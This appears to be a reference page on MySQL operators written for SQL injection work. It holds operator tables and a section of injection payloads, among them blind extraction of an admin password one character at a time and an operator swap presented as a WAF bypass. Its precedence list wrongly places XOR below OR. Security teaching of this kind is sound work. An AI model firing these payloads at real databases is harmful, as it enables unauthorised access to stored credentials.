---
title: Operators
description: MySQL operators useful for SQL injection techniques
category: Reference
order: 21
tags: ["operators", "comparison", "logical", "reference"]
lastUpdated: 2025-03-15
---

## Operators

Understanding MySQL operators is essential for crafting effective SQL injection payloads. This reference covers the most useful operators for SQL injection techniques.

### Comparison Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `=` | Equal | `SELECT * FROM users WHERE id = 1` |
| `<=>` | NULL-safe equal | `SELECT * FROM users WHERE name <=> NULL` |
| `<>` or `!=` | Not equal | `SELECT * FROM users WHERE id <> 1` |
| `>` | Greater than | `SELECT * FROM users WHERE id > 1` |
| `>=` | Greater than or equal | `SELECT * FROM users WHERE id >= 1` |
| `<` | Less than | `SELECT * FROM users WHERE id < 10` |
| `<=` | Less than or equal | `SELECT * FROM users WHERE id <= 10` |
| `BETWEEN` | Between range | `SELECT * FROM users WHERE id BETWEEN 1 AND 10` |
| `IS NULL` | Null check | `SELECT * FROM users WHERE email IS NULL` |
| `IS NOT NULL` | Not null check | `SELECT * FROM users WHERE email IS NOT NULL` |
| `LIKE` | Pattern matching | `SELECT * FROM users WHERE name LIKE 'a%'` |
| `REGEXP` | Regular expression | `SELECT * FROM users WHERE name REGEXP '^a'` |
| `IN` | In set | `SELECT * FROM users WHERE id IN (1,2,3)` |

### Logical Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `AND` or `&&` | Logical AND | `SELECT * FROM users WHERE active=1 AND admin=1` |
| `OR` or `\|\|` | Logical OR | `SELECT * FROM users WHERE id=1 OR username='admin'` |
| `NOT` or `!` | Logical NOT | `SELECT * FROM users WHERE NOT id=1` |
| `XOR` | Logical XOR | `SELECT * FROM users WHERE id=1 XOR admin=1` |

### Mathematical Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `+` | Addition | `SELECT id+1 FROM users` |
| `-` | Subtraction | `SELECT id-1 FROM users` |
| `*` | Multiplication | `SELECT id*2 FROM users` |
| `/` | Division | `SELECT id/2 FROM users` |
| `DIV` | Integer division | `SELECT id DIV 2 FROM users` |
| `%` or `MOD` | Modulo | `SELECT id % 2 FROM users` |

### Bitwise Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `&` | Bitwise AND | `SELECT 5 & 1` (returns 1) |
| `\|` | Bitwise OR | `SELECT 5 \| 1` (returns 5) |
| `^` | Bitwise XOR | `SELECT 5 ^ 1` (returns 4) |
| `<<` | Left shift | `SELECT 1 << 2` (returns 4) |
| `>>` | Right shift | `SELECT 4 >> 2` (returns 1) |
| `~` | Bitwise NOT | `SELECT ~1` (returns -2) |

### Assignment Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `:=` | Value assignment | `SET @var := 1` |

### String Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `CONCAT()` | String concatenation | `SELECT CONCAT(first_name, ' ', last_name) FROM users` |
| `CONCAT_WS()` | Concatenation with separator | `SELECT CONCAT_WS('-', 'a', 'b', 'c')` (returns 'a-b-c') |

### Usage in SQL Injection

#### Boolean-Based Blind Injection

```sql
-- Testing if admin exists
' OR EXISTS(SELECT * FROM users WHERE username='admin') -- -

-- Character by character extraction
' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97 -- -
```

#### Operator Precedence Exploitation

Operators follow a precedence order that can be exploited:

```sql
-- AND has higher precedence than OR
1=0 OR 1=1 AND 2=2 -- True because (1=1 AND 2=2) evaluates first

-- Using parentheses to control evaluation order
1=0 OR (1=1 AND 2=2) -- True
(1=0 OR 1=1) AND 2=2 -- True
```

#### Alternative Operator Forms

Using alternative forms can help bypass WAF filters:

```sql
-- Standard form
SELECT * FROM users WHERE id=1 OR username='admin'

-- Alternative form
SELECT * FROM users WHERE id=1 || username='admin'
```

#### Practical Examples in Injections

```sql
-- Using NOT to invert conditions
' OR NOT 2=3 -- -

-- Using IN for multiple values
' OR username IN ('admin','root') -- -

-- Using LIKE for pattern matching
' OR username LIKE 'adm%' -- -

-- Using BETWEEN for range checking
' OR id BETWEEN 1 AND 5 -- -
```

### Truth Table for Logical Operators

| Expr1 | Expr2 | AND | OR | XOR |
|-------|-------|-----|----|----|
| TRUE  | TRUE  | TRUE | TRUE | FALSE |
| TRUE  | FALSE | FALSE | TRUE | TRUE |
| FALSE | TRUE  | FALSE | TRUE | TRUE |
| FALSE | FALSE | FALSE | FALSE | FALSE |
| NULL  | TRUE  | NULL | TRUE | NULL |
| TRUE  | NULL  | NULL | TRUE | NULL |
| FALSE | NULL  | FALSE | NULL | NULL |
| NULL  | FALSE | FALSE | NULL | NULL |
| NULL  | NULL  | NULL | NULL | NULL |

### Operator Precedence in MySQL

From highest to lowest:

1. `!`, `~` (unary operators)
2. `^` (bitwise XOR)
3. `*`, `/`, `DIV`, `%`, `MOD`
4. `-`, `+` (binary operators)
5. `<<`, `>>`
6. `&`
7. `|`
8. `=`, `<=>`, `>=`, `>`, `<=`, `<`, `<>`, `!=`, `IS`, `LIKE`, `REGEXP`
9. `BETWEEN`, `CASE`, `WHEN`, `THEN`, `ELSE`
10. `NOT`
11. `AND`, `&&`
12. `OR`, `||`
13. `XOR`

Understanding operator precedence is crucial for complex injections.
